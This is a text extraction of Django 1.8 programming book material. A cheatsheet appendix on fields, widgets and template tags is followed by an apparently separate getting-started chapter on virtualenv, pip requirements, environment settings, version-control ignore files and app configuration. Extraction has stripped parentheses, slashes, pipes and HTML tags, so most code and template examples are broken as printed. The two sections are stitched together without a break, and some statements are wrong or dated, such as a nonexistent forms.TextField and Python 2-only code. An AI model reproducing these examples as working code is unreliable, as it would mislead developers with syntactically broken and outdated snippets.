capital letter first; Django will do it automatically.     choices: This defines the number of possible choices for the field.    db_column: This sets the name of the field created in the database.  [ 136 ]  Cheatsheet   The form fields It is possible to use all types of field models in the forms. Indeed, some types of model  fields have been created for a particular use in forms. For example, the TextField  model field has nothing different from CharField except the fact that by default, in  the form, the TextField field displays a   tag and a    name. So, you can write a form field as follows:  field1 = forms.TextField    Common options for the form fields The following options are common to all the form fields:     error_messages: This specifies a series of error messages    help_text: This sets a help message    required: This defines a field that must be filled     initial: This sets the default value for the field    validators: This defines a particular validator that validates the field value    widget: This defines a specific widget for the field  The widget form Widgets allow you to define HTML code that renders form fields. We'll explain what  widgets can generate as HTML code, as follows:     TextInput: This corresponds to      Textarea: This corresponds to       PasswordInput: This corresponds to      RadioSelect: This corresponds to      Select: This corresponds to         CheckboxInput: This corresponds to      FileInput: This corresponds to      HiddenInput: This corresponds to    [ 137 ]  Appendix   Error messages  forms and models  The following is a partial list of the error messages that can be set when form fields  are entered incorrectly:     required: This message is displayed when the user does not fill data in       min_length: This message is displayed when the user has not supplied      max_length: This message is displayed when the user has exceeded the size      min_value: This message is displayed when the value entered by the user is      max_value: This message is displayed when the value entered by the user is   the field  enough data  limit of a field  too low  too high  The template language When a developer develops templates, he she regularly needs to use the template  language and filters.  Template tags The following are the key elements of the template language:     {% autoescape on OR off %} {% endautoescape %}: This automatically  starts the auto-escape feature that helps protect the browser of the displayed  data  XSS .     {% block block_name %} {% endblock %}: This sets the blocks that can be   filled by templates that inherit from them.     {% comment %} {% endcomment %}: This sets a comment that will not be   sent to the user as HTML.     {% extends template_name %}: This overrides a template.    {% spaceless %}: This removes all the whitespaces between the HTML tags.    {% include template_name %}: This includes a template named   template_name in the current template. The blocks included templates that  cannot be redefined.  [ 138 ]  Cheatsheet   Loops in dictionaries This section shows you how to loop through a dictionary. The steps involved in  looping are as follows:     {% for var in list_var %}: This allows looping in the list_var dictionary    {% empty %}: This displays the subsequent code if the dictionary is empty    {% endfor %}: This indicates the end of a loop  Conditional statements This section shows how to execute a conditional statement:     {% if cond %}: This line checks the condition and discusses the following   code when enabled.     {% elif cond %}: This line checks another condition if the first has not been   verified. If this condition is satisfied, the following code will be processed.     {% else %}: This line will process the following code if none of the previous   conditions have been validated.     {% endif %}: This line ends the processing of conditions.  The template filters The following are the different template filters:     addslashes: This adds slashes before quotes    capfirst: This capitalizes the first character    lower: This converts the text into lowercase    upper: This converts the text into uppercase    title: This capitalizes all the first characters of each word    cut: This removes all the values of the argument from the given string, for   example, {{ valuecut:"*" }} removes all the * characters     linebreaks: This replaces line breaks in text with the appropriate HTML   tags     date: This displays a formatted date, for example, {{ valuedate:"D d M   Y" }} will display Wed 09 Jan 2008     pluralize: This allows you to display plurals, shown as follows:  You have {{ nb_products }} product{{ nb_productspluralize }} in  our cart.

Some of the tricks introduced here are the best ways to deal with  the project layout, settings, and configurations. However, for some tricks, you might have to  find some alternatives online or in other books about Django. Feel free to evaluate and choose  the best bits and pieces for yourself while digging deep into the Django world.  I am assuming that you are already familiar with the basics of Django, Subversion and Git  version control, MySQL and PostgreSQL databases, and command-line usage. Also, I am  assuming that you are probably using a Unix-based operating system, such as Mac OS X or  Linux. It makes more sense to develop with Django on Unix-based platforms as the websites  will most likely be published on a Linux server, therefore, you can establish routines that work  the same while developing as well as deploying. If you are locally working with Django on  Windows, the routines are similar; however, they are not always the same.  Working with a virtual environment It is very likely that you will develop multiple Django projects on your computer. Some modules  such as Python Imaging Library  or Pillow  and MySQLdb, can be installed once and then  shared for all projects. Other modules such as Django, third-party Python libraries, and  Django apps, will need to be kept isolated from each other. The virtualenv tool is a utility that  separates all the Python projects in their own realms. In this recipe, we will see how to use it.  Getting ready To manage Python packages, you will need pip. It is included in your Python installation if  you are using Python 2.7.9 or Python 3.4+. If you are using another version of Python, install  pip by executing the installation instructions at http:  pip.readthedocs.org en  stable installing . Let's install the shared Python modules Pillow and MySQLdb, and  the virtualenv utility, using the following commands:  $ sudo pip install Pillow  $ sudo pip install MySQL-python  $ sudo pip install virtualenv  146  Getting Started with Django 1.8   How to do it… Once you have your prerequisites installed, create a directory where all your Django projects  will be stored, for example, virtualenvs under your home directory. Perform the following  steps after creating the directory:  1.  Go to the newly created directory and create a virtual environment that uses the   shared system site packages: $ cd ~ virtualenvs  $ mkdir myproject_env  $ cd myproject_env  $ virtualenv --system-site-packages .  New python executable in . bin python  Installing setuptools………….done.  Installing pip……………done.  2.  To use your newly created virtual environment, you need to execute the activation   script in your current shell. This can be done with the following command: $ source bin activate  You can also use the following command one for the same  note the space between  the dot and bin : $ . bin activate  3.  You will see that the prompt of the command-line tool gets a prefix of the project   name, as follows:  myproject_env $  $ deactivate  4.  To get out of the virtual environment, type the following command:  How it works… When you create a virtual environment, a few specific directories  bin, build, include, and  lib  are created in order to store a copy of the Python installation and some shared Python  paths are defined. When the virtual environment is activated, whatever you have installed  with pip or easy_install will be put in and used by the site packages of the virtual  environment, and not the global site packages of your Python installation.  To install Django 1.8 in your virtual environment, type the following command:   myproject_env $ pip install Django==1.8  147  Chapter 1   See also   f The Creating a project file structure recipe  f The Deploying on Apache with mod_wsgi recipe in Chapter 11, Testing and Deployment  Creating a project file structure A consistent file structure for your projects makes you well-organized and more productive.  When you have the basic workflow defined, you can get in the business logic quicker and  create awesome projects.  Getting ready If you haven't done this yet, create a virtualenvs directory, where you will keep all your  virtual environments  read about this in the Working with a virtual environment recipe .   This can be created under your home directory.  Then, create a directory for your project's environment, for example, myproject_env. Start  the virtual environment in it. I would suggest adding the commands directory for local bash  scripts that are related to the project, the db_backups directory for database dumps, and the  project directory for your Django project. Also, install Django in your virtual environment.  How to do it… Follow these steps in order to create a file structure for your project:  1.  With the virtual environment activated, go to the project directory and start a new   Django project as follows:  myproject_env $ django-admin.py startproject myproject  For clarity, we will rename the newly created directory as django-myproject. This  is the directory that you will put under version control, therefore, it will have the .git,  .svn, or similar directories.  148  Getting Started with Django 1.8   2.   3.   4.   In the django-myproject directory, create a README.md file to describe your  project to the new developers. You can also put the pip requirements with the  Django version and include other external dependencies  read about this in the  Handling project dependencies with pip recipe . Also, this directory will contain your  project's Python package named myproject; Django apps  I recommend having  an app called utils for different functionalities that are shared throughout the  project ; a locale directory for your project translations if it is multilingual; a Fabric  deployment script named fabfile.py, as suggested in the Creating and using the  Fabric deployment script recipe in Chapter 11, Testing and Deployment; and the  externals directory for external dependencies that are included in this project if  you decide not to use pip requirements. In your project's Python package, myproject, create the media directory for project  uploads, the site_static directory for project-specific static files, the static  directory for collected static files, the tmp directory for the upload procedure, and the  templates directory for project templates. Also, the myproject directory should  contain your project settings, the settings.py and conf directories  read about  this in the Configuring settings for development, testing, staging, and production  environments recipe , as well as the urls.py URL configuration. In your site_static directory, create the site directory as a namespace for site- specific static files. Then, separate the separated static files in directories in it. For  instance, scss for Sass files  optional , css for the generated minified Cascading  Style Sheets, img for styling images and logos, js for JavaScript, and any third-party  module combining all types of files such as the tinymce rich-text editor. Besides the  site directory, the site_static directory might also contain overwritten static  directories of third-party apps, for example, cms overwriting static files from Django  CMS. To generate the CSS files from Sass and minify the JavaScript files, you can use  the CodeKit or Prepros applications with a graphical user interface.  5.  Put your templates that are separated by the apps in your templates directory. If a   template file represents a page  for example, change_item.html or item_list. html , then directly put it in the app's template directory. If the template is included  in another template  for example, similar_items.html , put it in the includes  subdirectory. Also, your templates directory can contain a directory called utils for  globally reusable snippets, such as pagination, language chooser, and others.  149  Chapter 1   How it works… The whole file structure for a complete project in a virtual environment will look similar to   the following:  150  Getting Started with Django 1.8   See also   f The Handling project dependencies with pip recipe  f The Including external dependencies in your project recipe  f The Configuring settings for development, testing, staging, and production   environments recipe   f The Deploying on Apache with mod_wsgi recipe in Chapter 11, Testing and Deployment  f The Creating and using the Fabric deployment script recipe in Chapter 11, Testing   and Deployment  Handling project dependencies with pip The pip is the most convenient tool to install and manage Python packages. Besides installing  the packages one by one, it is possible to define a list of packages that you want to install and  pass it to the tool so that it deals with the list automatically.  You will need to have at least two different instances of your project: the development  environment, where you create new features, and the public website environment that is  usually called the production environment in a hosted server. Additionally, there might be  development environments for other developers. Also, you may have a testing and staging  environment in order to test the project locally and in a public website-like situation.  For good maintainability, you should be able to install the required Python modules for  development, testing, staging, and production environments. Some of the modules will be  shared and some of them will be specific. In this recipe, we will see how to organize the  project dependencies and manage them with pip.  Getting ready Before using this recipe, you need to have pip installed and a virtual environment activated.  For more information on how to do this, read the Working with a virtual environment recipe.  How to do it… Execute the following steps one by one to prepare pip requirements for your Django project:  1.  Let's go to your Django project that you have under version control and create the   requirements directory with these text files: base.txt for shared modules, dev. txt for development environment, test.txt for testing environment, staging. txt for staging environment, and prod.txt for production.  151  Chapter 1   2.  Edit base.txt and add the Python modules that are shared in all environments, line   by line, for example:  base.txt  Django==1.8  djangorestframework  -e git:  github.com omab python-social-auth. git@6b1e301c79egg=python-social-auth  If the requirements of a specific environment are the same as in the base.txt, add the  line including the base.txt in the requirements file of that environment, for example:  prod.txt -r base.txt  If there are specific requirements for an environment, add them as shown in the  following:  dev.txt -r base.txt django-debug-toolbar selenium  5.  Now, you can run the following command in order to install all the required   dependencies for development environment  or analogous command for other  environments , as follows:  myproject_env $ pip install -r requirements dev.txt  How it works… The preceding command downloads and installs all your project dependencies from  requirements base.txt and requirements dev.txt in your virtual environment. As  you can see, you can specify a version of the module that you need for the Django framework  and even directly install from a specific commit at the Git repository for the python-social- auth in our example. In practice, installing from a specific commit would rarely be useful, for  instance, only when having third-party dependencies in your project with specific functionality  that are not supported in the recent versions anymore.  When you have many dependencies in your project, it is good practice to stick to specific  versions of the Python modules as you can then be sure that when you deploy your project  or give it to a new developer, the integrity doesn't get broken and all the modules function  without conflicts.  If you have already manually installed the project requirements with pip one by one, you  can generate the requirements base.txt file using the following command:   myproject_env $ pip freeze > requirements base.txt  3.   4.   152  Getting Started with Django 1.8   There's more… If you want to keep things simple and are sure that, for all environments, you will be using the  same dependencies, you can use just one file for your requirements named requirements. txt, by definition:   myproject_env $ pip freeze > requirements.txt  To install the modules in a new environment simply call the following command:   myproject_env $ pip install -r requirements.txt  If you need to install a Python library from other version control  system or local path, you can learn more about pip from the official  documentation at http:  pip.readthedocs.org en  latest reference pip_install.html.

In this recipe, we will  take a look at the operations to make your code compatible with both the Python versions.  Getting ready When creating a new Django project or upgrading an old existing project, consider following  the rules given in this recipe.  153  Chapter 1   How to do it… Making your code compatible with both Python versions consists of the following steps:  1.  At the top of each module, add from __future__ import unicode_literals   and then use usual quotes without a u prefix for Unicode strings and a b prefix for  bytestrings.  2.  To ensure that a value is bytestring, use the django.utils.encoding.smart_  bytes function. To ensure that a value is Unicode, use the django.utils. encoding.smart_text or django.utils.encoding.force_text function. 3.  For your models, instead of the __unicode__ method, use the __str__ method   and add the python_2_unicode_compatible decorator, as follows:  models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import \     python_2_unicode_compatible  @python_2_unicode_compatible class NewsArticle models.Model :     title = models.CharField _ "Title" , max_length=200      content = models.TextField _ "Content"        def __str__ self :         return self.title      class Meta:         verbose_name = _ "News Article"          verbose_name_plural = _ "News Articles"   4.  To iterate through dictionaries, use iteritems  , iterkeys  , and   itervalues   from django.utils.six. Take a look at the following: from django.utils.six import iteritems d = {"imported": 25, "skipped": 12, "deleted": 3} for k, v in iteritems d :     print "{0}: {1}".format k, v    5.  When you capture exceptions, use the as keyword, as follows:  try:     article = NewsArticle.objects.get slug="hello-world"  except NewsArticle.DoesNotExist as exc:  154  Getting Started with Django 1.8       pass except NewsArticle.MultipleObjectsReturned as exc:     pass  6.  To check the type of a value, use django.utils.six, as shown in the following:  from django.utils import six isinstance val, six.string_types   previously basestring isinstance val, six.text_type   previously unicode isinstance val, bytes   previously str isinstance val, six.integer_types   previously  int, long   7.   Instead of xrange, use range from django.utils.six.moves, as follows: from django.utils.six.moves import range for i in range 1, 11 :     print i   8.  To check whether the current version is Python 2 or Python 3, you can use the   following conditions: from django.utils import six if six.PY2:     print "This is Python 2"  if six.PY3:     print "This is Python 3"   How it works… All strings in Django projects should be considered as Unicode strings. Only the input of  HttpRequest and output of HttpResponse is usually in the UTF-8 encoded bytestring.  Many functions and methods in Python 3 now return the iterators instead of lists, which make  the language more efficient. To make the code compatible with both the Python versions, you  can use the six library that is bundled in Django.  Read more about writing compatible code in the official Django documentation at   https:  docs.djangoproject.com en 1.8 topics python3 .  Downloading the example code You can download the example code files for all Packt books that you have  purchased from your account at http:  www.packtpub.com. If you  purchased this book elsewhere, you can visit http:  www.packtpub. com support and register in order to have the files e-mailed directly to you.  155  Chapter 1   Including external dependencies in your  project Sometimes, it is better to include external dependencies in your project. This ensures that  whenever a developer upgrades third-party modules, all the other developers will receive   the upgraded version in the next update from the version control system  Git, Subversion,   or others .  Also, it is better to have external dependencies included in your project when the libraries are  taken from unofficial sources, that is, somewhere other than Python Package Index  PyPI , or  different version control systems.  Getting ready Start with a virtual environment with a Django project in it.  How to do it… Execute the following steps one by one:  1.   If you haven't done this already, create an externals directory under your Django  project django-myproject directory. Then, create the libs and apps directories  under it. The libs directory is for the Python modules that are required by your project, for  example, boto, Requests, Twython, Whoosh, and so on. The apps directory is for  third-party Django apps, for example, django-cms, django-haystack, django-storages,  and so on.  I highly recommend that you create the README.txt files in  the libs and apps directories, where you mention what each  module is for, what the used version or revision is, and where it is  taken from.  156  Getting Started with Django 1.8   2.  The directory structure should look something similar to the following:  3.  The next step is to put the external libraries and apps under the Python path so that   they are recognized as if they were installed. This can be done by adding the following  code in the settings:  settings.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os import sys  BASE_DIR = os.path.abspath os.path.join      os.path.dirname __file__ , ".."     EXTERNAL_LIBS_PATH = os.path.join      BASE_DIR, "externals", "libs"   EXTERNAL_APPS_PATH = os.path.join      BASE_DIR, "externals", "apps"   sys.path = ["", EXTERNAL_LIBS_PATH, EXTERNAL_APPS_PATH] + \     sys.path  How it works… A module is meant to be under the Python path if you can run Python and import that module.  One of the ways to put a module under the Python path is to modify the sys.path variable  before importing a module that is in an unusual location. The value of sys.path is a list of  directories starting with an empty string for the current directory, followed by the directories in  the virtual environment, and finally the globally shared directories of the Python installation.  You can see the value of sys.path in the Python shell, as follows:   myproject_env $ python  >>> import sys  >>> sys.path  157  Chapter 1   When trying to import a module, Python searches for the module in this list and returns the  first result that is found.  Therefore, we first define the BASE_DIR variable, which is the absolute path to one level  higher than the settings.py file. Then, we define the EXTERNAL_LIBS_PATH and  EXTERNAL_APPS_PATH variables, which are relative to BASE_DIR. Lastly, we modify the  sys.path property, adding new paths to the beginning of the list. Note that we also add an  empty string as the first path to search, which means that the current directory of any module  should always be checked first before checking other Python paths.  This way of including external libraries doesn't work cross-platform with the  Python packages that have C language bindings, for example, lxml. For  such dependencies, I would recommend using the pip requirements that  were introduced in the Handling project dependencies with pip recipe.  See also   f The Creating a project file structure recipe  f The Handling project dependencies with pip recipe  f The Defining relative paths in the settings recipe  f The Using the Django shell recipe in Chapter 10, Bells and Whistles  Configuring settings for development,  testing, staging, and production  environments As noted earlier, you will be creating new features in the development environment, test  them in the testing environment, then put the website to a staging server to let other people  to try the new features, and lastly, the website will be deployed to the production server for  public access. Each of these environments can have specific settings and you will see how to  organize them in this recipe.  Getting ready In a Django project, we'll create settings for each environment: development, testing, staging,  and production.  158  Getting Started with Django 1.8   How to do it… Follow these steps to configure project settings:  1.   In myproject directory, create a conf Python module with the following files:  __init__.py, base.py for shared settings, dev.py for development settings,  test.py for testing settings, staging.py for staging settings, and prod.py for  production settings.  2.  Put all your shared settings in conf base.py. 3.   If the settings of an environment are the same as the shared settings, then just  import everything from base.py there, as follows:  myproject conf prod.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from .base import *  4.  Apply the settings that you want to attach or overwrite for your specific environment in  the other files, for example, the development environment settings should go to dev. py as shown in the following:  myproject conf dev.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from .base import * EMAIL_BACKEND = \     "django.core.mail.backends.console.EmailBackend"  5.  At the beginning of the myproject settings.py, import the configurations from   one of the environment settings and then additionally attach specific or sensitive  configurations such as DATABASES or API keys that shouldn't be under version  control, as follows:  myproject settings.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from .conf.dev import *  DATABASES = {     "default": {         "ENGINE": "django.db.backends.mysql",         "NAME": "myproject",         "USER": "root",         "PASSWORD": "root",     } }  159  Chapter 1   6.  Create a settings.py.sample file that should contain all the sensitive settings   that are necessary for a project to run; however, with empty values set.  How it works… By default, the Django management commands use the settings from myproject  settings.py. Using the method that is defined in this recipe, we can keep all the required  non-sensitive settings for all environments under version control in the conf directory.  Whereas, the settings.py file itself would be ignored by version control and will only  contain the settings that are necessary for the current development, testing, staging, or  production environments.  See also   f The Creating and including local settings recipe  f The Defining relative paths in the settings recipe  f The Setting the Subversion ignore property recipe  f The Creating a Git ignore file recipe  Defining relative paths in the settings Django requires you to define different file paths in the settings, such as the root of your  media, the root of your static files, the path to templates, the path to translation files, and so  on. For each developer of your project, the paths may differ as the virtual environment can  be set up anywhere and the user might be working on Mac OS X, Linux, or Windows. Anyway,  there is a way to define these paths that are relative to your Django project directory.  Getting ready To start with, open settings.py.  How to do it… Modify your path-related settings accordingly instead of hardcoding the paths to your local  directories, as follows:   settings.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os  BASE_DIR = os.path.abspath   160  Getting Started with Django 1.8       os.path.join os.path.dirname __file__ , ".."     MEDIA_ROOT = os.path.join BASE_DIR, "myproject", "media"   STATIC_ROOT = os.path.join BASE_DIR, "myproject", "static"   STATICFILES_DIRS =       os.path.join BASE_DIR, "myproject", "site_static" ,    TEMPLATE_DIRS =       os.path.join BASE_DIR, "myproject", "templates" ,    LOCALE_PATHS =       os.path.join BASE_DIR, "locale" ,    FILE_UPLOAD_TEMP_DIR = os.path.join      BASE_DIR, "myproject", "tmp"    How it works… At first, we define BASE_DIR, which is an absolute path to one level higher than the  settings.py file. Then, we set all the paths relative to BASE_DIR using the os.path.join  function.  See also   f The Including external dependencies in your project recipe  Creating and including local settings Configuration doesn't necessarily need to be complex. If you want to keep things simple,   you can work with two settings files: settings.py for common configuration and   local_settings.py for sensitive settings that shouldn't be under version control.  161  Chapter 1   Getting ready Most of the settings for different environments will be shared and saved in version control.  However, there will be some settings that are specific to the environment of the project instance,  for example, database or e-mail settings. We will put them in the local_settings.py file.  How to do it… To use local settings in your project, perform the following steps:  1.  At the end of settings.py, add a version of local_settings.py that claims to   2.  Create local_settings.py and put your environment-specific settings there, as   be in the same directory, as follows:  settings.py  … put this at the end of the file … try:     execfile os.path.join          os.path.dirname __file__ , "local_settings.py"        except IOError:     pass  shown in the following:  local_settings.py DATABASES = {     "default": {         "ENGINE": "django.db.backends.mysql",         "NAME": "myproject",         "USER": "root",         "PASSWORD": "root",     } }  EMAIL_BACKEND = \     "django.core.mail.backends.console.EmailBackend"  INSTALLED_APPS +=       "debug_toolbar",    162  Getting Started with Django 1.8   How it works… As you can see, the local settings are not normally imported, they are rather included and  executed in the settings.py file itself. This allows you to not only create or overwrite the  existing settings, but also adjust the tuples or lists from the settings.py file. For example,  we add debug_toolbar to INSTALLED_APPS here in order to be able to debug the SQL  queries, template context variables, and so on.  See also   f The Creating a project file structure recipe  f The Toggling the Debug Toolbar recipe in Chapter 10, Bells and Whistles  Setting up STATIC_URL dynamically for  Subversion users If you set STATIC_URL to a static value, then each time you update a CSS file, JavaScript file,  or image, you will need to clear the browser cache in order to see the changes. There is a trick  to work around clearing the browser's cache. It is to have the revision number of the version  control system shown in STATIC_URL. Whenever the code is updated, the visitor's browser  will force the loading of all-new static files.  This recipe shows how to put a revision number in STATIC_URL for subversion users.  Getting ready Make sure that your project is under the subversion version control and you have BASE_DIR  defined in your settings, as shown in the Defining relative paths in the settings recipe.  Then, create the utils module in your Django project, and also create a file called misc.py  there.  How to do it… The procedure to put the revision number in the STATIC_URL setting consists of the following  two steps:  1.   Insert the following content:  utils misc.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals  163  Chapter 1   import subprocess  def get_media_svn_revision absolute_path :     repo_dir = absolute_path     svn_revision = subprocess.Popen          'svn info  grep "Revision"  awk \'{print $2}\'',         stdout=subprocess.PIPE, stderr=subprocess.PIPE,         shell=True, cwd=repo_dir, universal_newlines=True      rev = svn_revision.communicate  [0].partition '\n' [0]     return rev  2.  Then, modify the settings.py file and add the following lines:   settings.py  … somewhere after BASE_DIR definition … from utils.misc import get_media_svn_revision STATIC_URL = " static %s " % get_media_svn_revision BASE_DIR   How it works… The get_media_svn_revision   function takes the absolute_path directory as a  parameter and calls the svn info shell command in that directory to find out the current  revision. We pass BASE_DIR to the function as we are sure that it is under version control.  Then, the revision is parsed, returned, and included in the STATIC_URL definition.  See also   f The Setting up STATIC_URL dynamically for Git users recipe  f The Setting the Subversion ignore property recipe  Setting up STATIC_URL dynamically for Git  users If you don't want to refresh the browser cache each time you change your CSS and JavaScript  files, or while styling images, you need to set STATIC_URL dynamically with a varying path  component. With the dynamically changing URL, whenever the code is updated, the visitor's  browser will force loading of all-new uncached static files. In this recipe, we will set a dynamic  path for STATIC_URL when you use the Git version control system.  Getting ready Make sure that your project is under the Git version control and you have BASE_DIR defined  in your settings, as shown in the Defining relative paths in the settings recipe.  164  Getting Started with Django 1.8   If you haven't done it yet, create the utils module in your Django project. Also, create a  misc.py file there.  How to do it… The procedure to put the Git timestamp in the STATIC_URL setting consists of the following  two steps:  1.  Add the following content to the misc.py file placed in utils :   utils misc.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import subprocess from datetime import datetime  def get_git_changeset absolute_path :     repo_dir = absolute_path     git_show = subprocess.Popen          'git show --pretty=format:%ct --quiet HEAD',         stdout=subprocess.PIPE, stderr=subprocess.PIPE,         shell=True, cwd=repo_dir, universal_newlines=True,           timestamp = git_show.communicate  [0].partition '\n' [0]     try:         timestamp = \             datetime.utcfromtimestamp int timestamp       except ValueError:         return ""     changeset = timestamp.strftime '%Y%m%d%H%M%S'      return changeset  2.  Then, import the newly created get_git_changeset   function in the settings and   use it for the STATIC_URL path, as follows:  settings.py  … somewhere after BASE_DIR definition … from utils.misc import get_git_changeset STATIC_URL = " static %s " % get_git_changeset BASE_DIR   165  Chapter 1   How it works… The get_git_changeset   function takes the absolute_path directory as a parameter  and calls the git show shell command with the parameters to show the Unix timestamp of  the HEAD revision in the directory. As stated in the previous recipe, we pass BASE_DIR to the  function as we are sure that it is under version control. The timestamp is parsed; converted to  a string consisting of year, month, day, hour, minutes, and seconds; returned; and included in  the definition of STATIC_URL.  See also   f The Setting up STATIC_URL dynamically for Subversion users recipe  f The Creating the Git ignore file recipe  Setting UTF-8 as the default encoding for  MySQL configuration MySQL is the most popular open source database. In this recipe, I will tell you how to set  UTF-8 as the default encoding for it. Note that if you don't set this encoding in the database  configuration, you might get into a situation where LATIN1 is used by default with your UTF-8  encoded data. This will lead to database errors whenever symbols such as € are used. Also,  this recipe will save you from the difficulties of converting the database data from LATIN1 to  UTF-8, especially when you have some tables encoded in LATIN1 and others in UTF-8.  Getting ready Make sure that the MySQL database management system and the MySQLdb Python module  are installed and you are using the MySQL engine in your project's settings.  How to do it… Open the  etc mysql my.cnf MySQL configuration file in your favorite editor and ensure  that the following settings are set in the sections: [client], [mysql], and [mysqld],   as follows:    etc mysql my.cnf [client] default-character-set = utf8  [mysql]  166  Getting Started with Django 1.8   default-character-set = utf8  [mysqld] collation-server = utf8_unicode_ci init-connect = 'SET NAMES utf8' character-set-server = utf8  If any of the sections don't exist, create them in the file. Then, restart MySQL in your  command-line tool, as follows:  $  etc init.d mysql restart  How it works… Now, whenever you create a new MySQL database, the databases and all their tables will be  set in UTF-8 encoding by default.  Don't forget to set this in all computers where your project is developed or published.  Setting the Subversion ignore property If you are using Subversion for version control, you will need to keep most of the projects in  the repository; however, some files and directories should only stay locally and not be tracked.  Getting ready Make sure that your Django project is under the Subversion version control.  How to do it… Open your command-line tool and set your default editor as nano, vi, vim or any other that  you prefer, as follows:  $ export EDITOR=nano  If you don't have a preference, I would recommend using nano,  which is very intuitive and a simple text editor for the terminal.  Then, go to your project directory and type the following command:  $ svn propedit svn:ignore myproject  167  Chapter 1   This will open a temporary file in the editor, where you need to put the following file and  directory patterns for Subversion to ignore:   Project files and directories local_settings.py static media tmp   Byte-compiled   optimized   DLL files __pycache__ *.py[cod] *$py.class   C extensions *.so   PyInstaller *.manifest *.spec   Installer logs pip-log.txt pip-delete-this-directory.txt   Unit test   coverage reports htmlcov .tox .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover   Translations *.pot   Django stuff: *.log   PyBuilder target  168  Getting Started with Django 1.8   Save the file and exit the editor. For every other Python package in your project, you will  need to ignore several files and directories too. Just go to a directory and type the following  command:  $ svn propedit svn:ignore .  Then, put this in the temporary file, save it, and close the editor, as follows:   Byte-compiled   optimized   DLL files __pycache__ *.py[cod] *$py.class   C extensions *.so   PyInstaller *.manifest *.spec   Installer logs pip-log.txt pip-delete-this-directory.txt   Unit test   coverage reports htmlcov .tox .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover   Translations *.pot   Django stuff: *.log   PyBuilder target  169  Chapter 1   How it works… In Subversion, you need to define the ignore properties for each directory of your project.  Mainly, we don't want to track the Python-compiled files, for instance, *.pyc. We also want to  ignore local_settings.py that is specific for each environment, static that replicates  collected static files from different apps, media that contains uploaded files and changes  together with the database, and tmp that is temporarily used for file uploads.  If you keep all your settings in a conf Python package  as described in the Configuring settings for development,  testing, staging, and production environments recipe, add  settings.py to the ignored files too.  See also   f The Creating and including local settings recipe  f The Creating the Git ignore file recipe  Creating the Git ignore file If you are using Git—the most popular distributed version control system—ignoring some files  and folders from version control is much easier than with Subversion.  Getting ready Make sure that your Django project is under the Git version control.  How to do it… Using your favorite text editor, create a .gitignore file at the root of your Django project and  put these files and directories there, as follows:   .gitignore  Project files and directories  myproject local_settings.py  myproject static   myproject tmp   myproject media    Byte-compiled   optimized   DLL files __pycache__   170  Getting Started with Django 1.8   *.py[cod] *$py.class   C extensions *.so   PyInstaller *.manifest *.spec   Installer logs pip-log.txt pip-delete-this-directory.txt   Unit test   coverage reports htmlcov  .tox  .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover   Translations *.pot   Django stuff: *.log   Sphinx documentation docs _build    PyBuilder target   How it works… The .gitignore file specifies the paths that should intentionally be untracked by the    Git version control system. The .gitignore file that we created in this recipe will ignore  the Python-compiled files, local settings, collected static files, temporary directory for  uploads,  and media directory with the uploaded files.  171  Chapter 1   If you keep all your settings in a conf Python package as described in  the Configuring settings for development, testing, staging, and production  environments recipe, add settings.py to the ignored files too.  See also   f The Setting the Subversion ignore property recipe  Deleting Python-compiled files When you run your project for the first time, Python compiles all your *.py code in   bytecode-compiled files, *.pyc, which are used later for execution.  Normally, when you change the *.py files, *.pyc is recompiled; however, sometimes   when switching branches or moving the directories, you need to clean up the compiled   files manually.  Getting ready Use your favorite editor and edit or create a .bash_profile file in your home directory.  How to do it… Add this alias at the end of .bash_profile, as follows:   ~ .bash_profile alias delpyc="find . -name \"*.pyc\" -delete"  Now, to clean the Python-compiled files, go to your project directory and type the following  command in the command line:  $ delpyc  How it works… At first, we create a Unix alias that searches for the *.pyc files and deletes them in the  current directory and its children. The .bash_profile file is executed when you start   a new session in the command-line tool.  172  Getting Started with Django 1.8   See also   f The Setting the Subversion ignore property recipe  f The Creating the Git ignore file recipe  Respecting the import order in Python files When you create the Python modules, it is good practice to stay consistent with the structure  in the files. This makes it easier for other developers and yourself to read the code. This recipe  will show you how to structure your imports.  Getting ready Create a virtual environment and a Django project in it.  How to do it… Use the following structure in a Python file that you create. Just after the first line that defines  UTF-8 as the default Python file encoding, put the imports categorized in sections, as follows:   -*- coding: UTF-8 -*-  System libraries from __future__ import unicode_literals import os import re from datetime import datetime   Third-party libraries import boto from PIL import Image   Django modules from django.db import models from django.conf import settings   Django apps from cms.models import Page   Current-app modules from . import app_settings  173  Chapter 1   How it works… We have five main categories for the imports, as follows:   f System libraries for packages in the default installation of Python  f Third-party libraries for the additionally installed Python packages  f Django modules for different modules from the Django framework  f Django apps for third-party and local apps  f Current-app modules for relative imports from the current app  There's more… When coding in Python and Django, use the official style guide for Python code, PEP 8.

See also   f The Handling project dependencies with pip recipe  f The Including external dependencies in your project recipe  Creating app configuration When developing a website with Django, you create one module for the project itself and  then, multiple Python modules called applications or apps that combine the different  modular functionalities and usually consist of models, views, forms, URL configurations,  management commands, migrations, signals, tests, and so on. The Django framework has  application registry, where all apps and models are collected and later used for configuration  and introspection. Since Django 1.7, meta information about apps can be saved in the  AppConfig instance for each used app. Let's create a sample magazine app to take a look  at how to use the app configuration there.  Getting ready Either create your Django app manually or using this command in your virtual environment   learn how to use virtual environments in the Working with a virtual environment recipe ,   as follows:   myproject_env $ django-admin.py startapp magazine  174  Getting Started with Django 1.8   Add some NewsArticle model to models.py, create administration for the model  in admin.py, and put "magazine" in INSTALLED_APPS in the settings. If you are  not yet familiar with these tasks, study the official Django tutorial at https:  docs. djangoproject.com en 1.8 intro tutorial01 .  How to do it… Follow these steps to create and use the app configuration:  1.  First of all, create the apps.py file and put this content in it, as follows:   magazine apps.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.apps import AppConfig from django.utils.translation import ugettext_lazy as _  class MagazineAppConfig AppConfig :     name = "magazine"     verbose_name = _ "Magazine"       def ready self :         from . import signals  2.  Then, edit the __init__.py file of the app and put the following content:   magazine __init__.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals default_app_config = "magazine.apps.MagazineAppConfig"  3.  Lastly, let's create a signals.py file and add some signal handlers there:   magazine 